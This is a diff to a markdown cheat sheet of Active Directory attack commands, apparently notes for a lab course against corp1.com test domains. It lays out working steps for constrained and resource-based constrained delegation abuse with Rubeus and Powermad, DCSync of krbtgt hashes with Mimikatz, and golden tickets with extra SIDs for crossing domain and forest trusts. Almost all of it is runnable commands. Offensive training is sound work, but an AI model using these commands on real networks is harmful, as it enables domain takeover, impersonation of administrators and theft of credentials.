@@ -43,7 +43,7 @@ lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
 ```
 
 ### Constrainted Delegation
-**Logic**: Check TrustedtoAuth for the user (msds-allowedtodelegateto) → Generate TGT → S4U Authentication 
+**Logic**: Check TrustedtoAuth firled for the user (**msds-allowedtodelegateto**) → Generate TGT → S4U Authentication → Modify authentication for alt service 
 ```powershell
 # Check Trusted to Auth
 Get-DomainUser -TrustedToAuth
@@ -52,6 +52,85 @@ Get-DomainUser -TrustedToAuth
 .\Rubeus.exe hash /password:lab
 .\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
 
-#Perform authentication
+#Perform authentication/ alt service authentication
 .\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
+.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt
+```
+
+### Resource Constrainted Constrainted Delegation
+**Logic**: GenericAll on Computer Object → Check Machine Account Quota → Creat Machine Account and put into msDS-AllowedToActOnBehalfOfOtherIdentity → Create S4U 
+```powershell
+# Check GenericAll
+Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+
+# Check Machine Account Quota
+Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
+
+# Add Machine Account
+. .\powermad.ps1
+New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
+Get-DomainComputer -Identity myComputer
+
+# Check SID and Convert to Binary Formmat
+$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
+$SDbytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDbytes,0)
+
+#Assign Binary format SID into msds-allowedtoactonbehalfofotheridentity
+Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
+$Descriptor.DiscretionaryAcl
+.\Rubeus.exe hash /password:h4x
+.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt
+```
+
+## Within Forest Operation
+**Logic**: Check Forest Trust first (Direct_Inbound & Direct_Outbound) inside **Flags**
+**Key**: TrustAttributes: WITHIN_FOREST (Inside Same Forest), FOREST_TRANSITIVE (Outside Forest)
+### Enumeration
+```powershell
+Get-DomainTrust -API
+Get-DomainTrust
+Get-DomainUser -Domain corp1.com
+```
+**Logic**: SYSTEM at Primary Domain (Prod.corp1.com) + Corp1$ NTLM Hash inside Prod.corp1.com → SYSTEM at Secondary Domain (Corp1.com)
+```powershell
+#Mimikatz Get Domain Hash
+lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
+
+Get-DomainSID -Domain prod.corp1.com 
+Get-DomainSid -Domain corp1.com 
+
+kerberos::golden /user:h4x /domain:<Domain Name> /sid:<Domain SID> /krbtgt:<NTLM of KRBTGT> /sids:<External Forest Enterprise Admin SID> /ptt
+```
+
+## Extra-Forest Operation
+### Enumeration
+**Attack Path 1:** Enumeration of External Trusted Group → Compromise the account → Gain Extenral Forest 
+**Attack Path 2:** Gain KRBTGT Hash → SIDS 
+**ATtack Path 3:** Gain LinkedSQL in both domains
+```powershell
+#PowerView 
+Get-DomainTrustMapping
+
+#Check groups in a trusted forest or domain that contains non-native members
+#Compromise this account can easily gain access to the forest
+#Check MemberName: SID field
+Get-DomainForeignGroupMember -Domain corp2.com 
+convertfrom-sid <SID>
+
+#Check LinkedSQL
+setspn -T prod -Q MSSQLSvc/*
+```
+
+### Exploitation
+```powershell
+lsadump::dcsync /domain:corp1.com /user:corp1\krbtgt
+Get-DomainSID -domain corp1.com
+Get-DomainSID -domain corp2.com
+
+#Check Forest Group SID must be larger than 1000, it must be > 1000 (Custom Group in External Forest)
+Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com
+kerberos::golden /user:h4x /domain:<Domain> /sid:<Domain SID> /krbtgt:<Domain NTLM Hash of KRBTGT> /sids:<External Forest Enterprise Admin SID Custom Group>  /ptt
 ```
